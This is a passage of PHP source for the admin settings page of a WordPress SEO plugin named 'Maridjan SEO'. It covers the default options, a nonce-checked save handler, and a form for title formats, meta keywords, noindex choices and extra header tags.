				"maridjancahaya_page_title_format"=>'%page_title% | %blog_title%',
				"maridjancahaya_category_title_format"=>'%category_title% | %blog_title%',
				"maridjancahaya_archive_title_format"=>'%date% | %blog_title%',
				"maridjancahaya_tag_title_format"=>'%tag% | %blog_title%',
				"maridjancahaya_search_title_format"=>'%search% | %blog_title%',
				"maridjancahaya_description_format"=>'%description%',
				"maridjancahaya_404_title_format"=>'Nothing found for %request_words%',
				"maridjancahaya_paged_format"=>' - Part %page%',
				"maridjancahaya_use_categories"=>0,
				"maridjancahaya_dynamic_postspage_keywords"=>1,
				"maridjancahaya_category_noindex"=>1,
				"maridjancahaya_archive_noindex"=>1,
				"maridjancahaya_tags_noindex"=>0,
				"maridjancahaya_cap_cats"=>1,
				"maridjancahaya_generate_descriptions"=>1,
				"maridjancahaya_debug_info"=>null,
				"maridjancahaya_post_meta_tags"=>'',
				"maridjancahaya_page_meta_tags"=>'',
				"maridjancahaya_home_meta_tags"=>'',
				'home_google_site_verification_meta_tag' => '',
				'maridjancahaya_use_tags_as_keywords' => 1);
			update_option('maridjancahayap_options', $res_maridjancahayap_options);
		}
		if ($_POST['action'] && $_POST['action'] == 'maridjancahaya_update' && $_POST['Submit'] != '')
		{
			$nonce = $_POST['nonce-maridjancahayap'];
		
			if (!wp_verify_nonce($nonce, 'maridjancahayap-nonce'))
				die ( 'Security Check - If you receive this in error, log out and back in to WordPress');
				
			$message = __("Maridjan SEO Options Updated.", 'maridjancahaya');
			
			$Maridjan_SEO_aturan['maridjancahaya_can'] = $_POST['maridjancahaya_can'];
			$Maridjan_SEO_aturan['maridjancahaya_home_title'] = $_POST['maridjancahaya_home_title'];
			$Maridjan_SEO_aturan['maridjancahaya_home_description'] = $_POST['maridjancahaya_home_description'];
			$Maridjan_SEO_aturan['maridjancahaya_home_keywords'] = $_POST['maridjancahaya_home_keywords'];
			$Maridjan_SEO_aturan['maridjancahaya_max_words_excerpt'] = $_POST['maridjancahaya_max_words_excerpt'];
			$Maridjan_SEO_aturan['maridjancahaya_tulis_kembali'] = $_POST['maridjancahaya_tulis_kembali'];
			$Maridjan_SEO_aturan['maridjancahaya_post_title_format'] = $_POST['maridjancahaya_post_title_format'];
			$Maridjan_SEO_aturan['maridjancahaya_page_title_format'] = $_POST['maridjancahaya_page_title_format'];
			$Maridjan_SEO_aturan['maridjancahaya_category_title_format'] = $_POST['maridjancahaya_category_title_format'];
			$Maridjan_SEO_aturan['maridjancahaya_archive_title_format'] = $_POST['maridjancahaya_archive_title_format'];
			$Maridjan_SEO_aturan['maridjancahaya_tag_title_format'] = $_POST['maridjancahaya_tag_title_format'];
			$Maridjan_SEO_aturan['maridjancahaya_search_title_format'] = $_POST['maridjancahaya_search_title_format'];
			$Maridjan_SEO_aturan['maridjancahaya_description_format'] = $_POST['maridjancahaya_description_format'];
			$Maridjan_SEO_aturan['maridjancahaya_404_title_format'] = $_POST['maridjancahaya_404_title_format'];
			$Maridjan_SEO_aturan['maridjancahaya_paged_format'] = $_POST['maridjancahaya_paged_format'];
			$Maridjan_SEO_aturan['maridjancahaya_use_categories'] = $_POST['maridjancahaya_use_categories'];
			$Maridjan_SEO_aturan['maridjancahaya_dynamic_postspage_keywords'] = $_POST['maridjancahaya_dynamic_postspage_keywords'];
			$Maridjan_SEO_aturan['maridjancahaya_category_noindex'] = $_POST['maridjancahaya_category_noindex'];
			$Maridjan_SEO_aturan['maridjancahaya_archive_noindex'] = $_POST['maridjancahaya_archive_noindex'];
			$Maridjan_SEO_aturan['maridjancahaya_tags_noindex'] = $_POST['maridjancahaya_tags_noindex'];
			$Maridjan_SEO_aturan['maridjancahaya_generate_descriptions'] = $_POST['maridjancahaya_generate_descriptions'];
			$Maridjan_SEO_aturan['maridjancahaya_cap_cats'] = $_POST['maridjancahaya_cap_cats'];
			$Maridjan_SEO_aturan['maridjancahaya_debug_info'] = $_POST['maridjancahaya_debug_info'];
			$Maridjan_SEO_aturan['maridjancahaya_post_meta_tags'] = $_POST['maridjancahaya_post_meta_tags'];
			$Maridjan_SEO_aturan['maridjancahaya_page_meta_tags'] = $_POST['maridjancahaya_page_meta_tags'];
			$Maridjan_SEO_aturan['maridjancahaya_home_meta_tags'] = $_POST['maridjancahaya_home_meta_tags'];
			$Maridjan_SEO_aturan['maridjancahaya_home_google_site_verification_meta_tag'] = $_POST['maridjancahaya_home_google_site_verification_meta_tag'];
			$Maridjan_SEO_aturan['maridjancahaya_ex_pages'] = $_POST['maridjancahaya_ex_pages'];
			$Maridjan_SEO_aturan['maridjancahaya_use_tags_as_keywords'] = $_POST['maridjancahaya_use_tags_as_keywords'];

			update_option('maridjancahayap_options', $Maridjan_SEO_aturan);

			if (function_exists('wp_cache_flush'))
			{
				wp_cache_flush();
			}
		}
?>
<?php if ($message) : ?>
  <div id="message" class="updated fade">
    <p>
      <?php echo $message; ?>
    </p>
  </div>
<?php endif; ?>
  <div id="dropmessage" class="updated" style="display:none;"></div>
  <div class="wrap">
    <h2>
      <?php _e('Maridjan SEO Options', 'maridjancahaya'); ?>
    </h2>
    <div style="clear:both;"></div>
<script type="text/javascript">
function toggleVisibility(id)
{
  var e = document.getElementById(id);

  if(e.style.display == 'block')
    e.style.display = 'none';
  else
    e.style.display = 'block';
}
</script>
    <form name="dofollow" action="" method="post">
      <table class="form-table">
        <?php $Maridjan_SEO_aturan = get_option('maridjancahayap_options'); ?>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_home_title_tip');">
              <?php _e('Home Title:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <textarea cols="57" rows="2" name="maridjancahaya_home_title"><?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_home_title']))?></textarea>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_home_title_tip">
              <?php _e('As the name implies, this will be the title of your homepage. This is independent of any other option. If not set, the default blog title will get used.', 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_home_description_tip');">
              <?php _e('Home Description:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <textarea cols="57" rows="2" name="maridjancahaya_home_description"><?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_home_description']))?></textarea>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_home_description_tip">
              <?php _e('The META description for your homepage. Independent of any other options, the default is no META description at all if this is not set.', 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_home_keywords_tip');">
              <?php _e('Home Keywords (comma separated):', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <textarea cols="57" rows="2" name="maridjancahaya_home_keywords"><?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_home_keywords'])); ?></textarea>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_home_keywords_tip">
              <?php _e("A comma separated list of your most important keywords for your site that will be written as META keywords on your homepage. Don't stuff everything in here.", 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_can_tip');">
              <?php _e('Canonical URLs:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_can" <?php if ($Maridjan_SEO_aturan['maridjancahaya_can']) echo 'checked="checked"'; ?>/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_can_tip">
              <?php _e("This option will automatically generate Canonical URLS for your entire WordPress installation.  This will help to prevent duplicate content penalties by <a href='http://googlewebmastercentral.blogspot.com/2009/02/specify-your-canonical.html' target='_blank'>Google</a>.", 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_tulis_kembali_tip');">
              <?php _e('Rewrite Titles:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_tulis_kembali" <?php if ($Maridjan_SEO_aturan['maridjancahaya_tulis_kembali']) echo 'checked="checked"'; ?>/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_tulis_kembali_tip">
              <?php _e("Note that this is all about the title tag. This is what you see in your browser's window title bar. This is NOT visible on a page, only in the window title bar and of course in the source. If set, all page, post, category, search and archive page titles get rewritten. You can specify the format for most of them. For example: The default templates puts the title tag of posts like this: Blog Archive >> Blog Name >> Post Title (maybe I've overdone slightly). This is far from optimal. With the default post title format, Rewrite Title rewrites this to Post Title | Blog Name. If you have manually defined a title (in one of the text fields for All in One SEO Plugin input) this will become the title of your post in the format string.", 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_post_title_format_tip');">
              <?php _e('Post Title Format:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input size="59" name="maridjancahaya_post_title_format" value="<?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_post_title_format'])); ?>"/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_post_title_format_tip">
<?php
_e('The following macros are supported:', 'maridjan_SEO');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%post_title% - The original title of the post', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%category_title% - The (main) category of the post', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%category% - Alias for %category_title%', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e("%post_author_login% - This post's author' login", 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e("%post_author_nicename% - This post's author' nicename", 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e("%post_author_firstname% - This post's author' first name (capitalized)", 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e("%post_author_lastname% - This post's author' last name (capitalized)", 'maridjan_SEO'); echo('</li>');
echo('</ul>');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_page_title_format_tip');">
              <?php _e('Page Title Format:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input size="59" name="maridjancahaya_page_title_format" value="<?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_page_title_format'])); ?>"/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_page_title_format_tip">
<?php
_e('The following macros are supported:', 'maridjan_SEO');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%page_title% - The original title of the page', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e("%page_author_login% - This page's author' login", 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e("%page_author_nicename% - This page's author' nicename", 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e("%page_author_firstname% - This page's author' first name (capitalized)", 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e("%page_author_lastname% - This page's author' last name (capitalized)", 'maridjan_SEO'); echo('</li>');
echo('</ul>');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_category_title_format_tip');">
              <?php _e('Category Title Format:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input size="59" name="maridjancahaya_category_title_format" value="<?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_category_title_format'])); ?>"/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_category_title_format_tip">
<?php
_e('The following macros are supported:', 'maridjan_SEO');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%category_title% - The original title of the category', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%category_description% - The description of the category', 'maridjan_SEO'); echo('</li>');
echo('</ul>');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_archive_title_format_tip');">
              <?php _e('Archive Title Format:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input size="59" name="maridjancahaya_archive_title_format" value="<?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_archive_title_format'])); ?>"/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_archive_title_format_tip">
<?php
_e('The following macros are supported:', 'maridjan_SEO');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%date% - The original archive title given by wordpress, e.g. "2007" or "2007 August"', 'maridjan_SEO'); echo('</li>');
echo('</ul>');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_tag_title_format_tip');">
              <?php _e('Tag Title Format:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input size="59" name="maridjancahaya_tag_title_format" value="<?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_tag_title_format'])); ?>"/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_tag_title_format_tip">
<?php
_e('The following macros are supported:', 'maridjan_SEO');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%tag% - The name of the tag', 'maridjan_SEO'); echo('</li>');
echo('</ul>');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_search_title_format_tip');">
              <?php _e('Search Title Format:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input size="59" name="maridjancahaya_search_title_format" value="<?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_search_title_format'])); ?>"/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_search_title_format_tip">
<?php
_e('The following macros are supported:', 'maridjan_SEO');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%search% - What was searched for', 'maridjan_SEO'); echo('</li>');
echo('</ul>');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_description_format_tip');">
              <?php _e('Description Format:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input size="59" name="maridjancahaya_description_format" value="<?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_description_format'])); ?>" />
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_description_format_tip">
<?php
_e('The following macros are supported:', 'maridjan_SEO');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%description% - The original description as determined by the plugin, e.g. the excerpt if one is set or an auto-generated one if that option is set', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%wp_title% - The original wordpress title, e.g. post_title for posts', 'maridjan_SEO'); echo('</li>');
echo('</ul>');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_404_title_format_tip');">
              <?php _e('404 Title Format:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input size="59" name="maridjancahaya_404_title_format" value="<?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_404_title_format'])); ?>"/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_404_title_format_tip">
<?php
_e('The following macros are supported:', 'maridjan_SEO');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%request_url% - The original URL path, like "/url-that-does-not-exist/"', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%request_words% - The URL path in human readable form, like "Url That Does Not Exist"', 'maridjan_SEO'); echo('</li>');
echo('<li>'); _e('%404_title% - Additional 404 title input"', 'maridjan_SEO'); echo('</li>');
echo('</ul>');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_paged_format_tip');">
              <?php _e('Paged Format:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input size="59" name="maridjancahaya_paged_format" value="<?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_paged_format'])); ?>"/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_paged_format_tip">
<?php
_e('This string gets appended/prepended to titles when they are for paged index pages (like home or archive pages).', 'maridjan_SEO');
_e('The following macros are supported:', 'maridjan_SEO');
echo('<ul>');
echo('<li>'); _e('%page% - The page number', 'maridjan_SEO'); echo('</li>');
echo('</ul>');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_use_categories_tip');">
              <?php _e('Use Categories for META keywords:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_use_categories" <?php if ($Maridjan_SEO_aturan['maridjancahaya_use_categories']) echo 'checked="checked"'; ?>/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_use_categories_tip">
              <?php _e('Check this if you want your categories for a given post used as the META keywords for this post (in addition to any keywords and tags you specify on the post edit page).', 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_use_tags_as_keywords_tip');">
              <?php _e('Use Tags for META keywords:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_use_tags_as_keywords" <?php if ($Maridjan_SEO_aturan['maridjancahaya_use_tags_as_keywords']) echo 'checked="checked"'; ?>/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_use_tags_as_keywords_tip">
              <?php _e('Check this if you want your tags for a given post used as the META keywords for this post (in addition to any keywords you specify on the post edit page).', 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_dynamic_postspage_keywords_tip');">
              <?php _e('Dynamically Generate Keywords for Posts Page:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_dynamic_postspage_keywords" <?php if ($Maridjan_SEO_aturan['maridjancahaya_dynamic_postspage_keywords']) echo 'checked="checked"'; ?>/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_dynamic_postspage_keywords_tip">
              <?php _e('Check this if you want your keywords on a custom posts page (set it in options->reading) to be dynamically generated from the keywords of the posts showing on that page.  If unchecked, it will use the keywords set in the edit page screen for the posts page.', 'maridjan_SEO') ?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_category_noindex_tip');">
              <?php _e('Use noindex for Categories:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_category_noindex" <?php if ($Maridjan_SEO_aturan['maridjancahaya_category_noindex']) echo 'checked="checked"'; ?>/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_category_noindex_tip">
              <?php _e('Check this for excluding category pages from being crawled. Useful for avoiding duplicate content.', 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_archive_noindex_tip');">
              <?php _e('Use noindex for Archives:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_archive_noindex" <?php if ($Maridjan_SEO_aturan['maridjancahaya_archive_noindex']) echo 'checked="checked"'; ?>/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_archive_noindex_tip">
              <?php _e('Check this for excluding archive pages from being crawled. Useful for avoiding duplicate content.', 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_tags_noindex_tip');">
              <?php _e('Use noindex for Tag Archives:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_tags_noindex" <?php if ($Maridjan_SEO_aturan['maridjancahaya_tags_noindex']) echo 'checked="checked"'; ?>/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_tags_noindex_tip">
              <?php _e('Check this for excluding tag pages from being crawled. Useful for avoiding duplicate content.', 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_generate_descriptions_tip');">
              <?php _e('Autogenerate Descriptions:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_generate_descriptions" <?php if ($Maridjan_SEO_aturan['maridjancahaya_generate_descriptions']) echo 'checked="checked"'; ?>/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_generate_descriptions_tip">
              <?php _e("Check this and your META descriptions will get autogenerated if there's no excerpt.", 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_cap_cats_tip');">
              <?php _e('Capitalize Category Titles:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_cap_cats" <?php if ($Maridjan_SEO_aturan['maridjancahaya_cap_cats']) echo 'checked="checked"'; ?>/>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_cap_cats_tip">
              <?php _e("Check this and Category Titles will have the first letter of each word capitalized.", 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_ex_pages_tip');">
              <?php _e('Exclude Pages:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <textarea cols="57" rows="2" name="maridjancahaya_ex_pages"><?php echo esc_attr(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_ex_pages']))?></textarea>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_ex_pages_tip">
              <?php _e("Enter any comma separated pages here to be excluded by All in One SEO Pack.  This is helpful when using plugins which generate their own non-WordPress dynamic pages.  Ex: <em>/forum/,/contact/</em>  For instance, if you want to exclude the virtual pages generated by a forum plugin, all you have to do is give forum or /forum or /forum/ or and any URL with the word \"forum\" in it, such as http://mysite.com/forum or http://mysite.com/forum/someforumpage will be excluded from Maridjan SEO.", 'maridjan_SEO')?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_post_meta_tags_tip');">
              <?php _e('Additional Post Headers:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <textarea cols="57" rows="2" name="maridjancahaya_post_meta_tags"><?php echo htmlspecialchars(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_post_meta_tags']))?></textarea>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_post_meta_tags_tip">
<?php
_e('What you enter here will be copied verbatim to your header on post pages. You can enter whatever additional headers you want here, even references to stylesheets.', 'maridjan_SEO');
echo '<br/>';
_e('NOTE: This field currently only support meta tags.', 'maridjan_SEO');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_page_meta_tags_tip');">
              <?php _e('Additional Page Headers:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <textarea cols="57" rows="2" name="maridjancahaya_page_meta_tags"><?php echo htmlspecialchars(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_page_meta_tags']))?></textarea>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_page_meta_tags_tip">
<?php
_e('What you enter here will be copied verbatim to your header on pages. You can enter whatever additional headers you want here, even references to stylesheets.', 'maridjan_SEO');
echo '<br/>';
_e('NOTE: This field currently only support meta tags.', 'maridjan_SEO');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_home_meta_tags_tip');">
              <?php _e('Additional Home Headers:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
            <textarea cols="57" rows="2" name="maridjancahaya_home_meta_tags"><?php echo htmlspecialchars(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_home_meta_tags']))?></textarea>
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_home_meta_tags_tip">
<?php
_e('What you enter here will be copied verbatim to your header on the home page. You can enter whatever additional headers you want here, even references to stylesheets.', 'maridjan_SEO');
echo '<br/>';
_e('NOTE: This field currently only support meta tags.', 'maridjan_SEO');
?>
            </div>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <a style="cursor:pointer;" title="<?php _e('Click for Help!', 'maridjan_SEO')?>" onclick="toggleVisibility('maridjancahaya_home_google_site_verification_meta_tag_tip');">
              <?php //_e('Google Verification Meta Tag:', 'maridjan_SEO')?>
            </a>
          </th>
          <td>
		   <!-- <textarea cols="65" rows="1" name="maridjancahaya_home_google_site_verification_meta_tag"><?php echo htmlspecialchars(stripcslashes($Maridjan_SEO_aturan['maridjancahaya_home_google_site_verification_meta_tag']))?></textarea> -->
            <div style="max-width:500px; text-align:left; display:none" id="maridjancahaya_home_google_site_verification_meta_tag_tip">
<?php
_e('What you enter here will be copied verbatim to your header on the home page. Webmaster Tools provides the meta tag in XHTML syntax.', 'maridjan_SEO');
echo('<br/>');
echo('1. '); _e('On the Webmaster Tools Home page, click Verify this site next to the site you want.', 'maridjan_SEO');
echo('<br/>');
echo('2. '); _e('In the Verification method list, select Meta tag, and follow the steps on your screen.', 'maridjan_SEO');
echo('<br/>');
_e('Once you have added the tag to your home page, click Verify.', 'maridjan_SEO');
?>
            </div>
          </td>
        </tr>
      </table>
      <p class="submit">
        <?php if($Maridjan_SEO_aturan) {  ?>
        <input type="hidden" name="action" value="maridjancahaya_update" />
        <input type="hidden" name="nonce-maridjancahayap" value="<?php echo esc_attr(wp_create_nonce('maridjancahayap-nonce')); ?>" />
        <input type="hidden" name="page_options" value="maridjancahaya_home_description" />
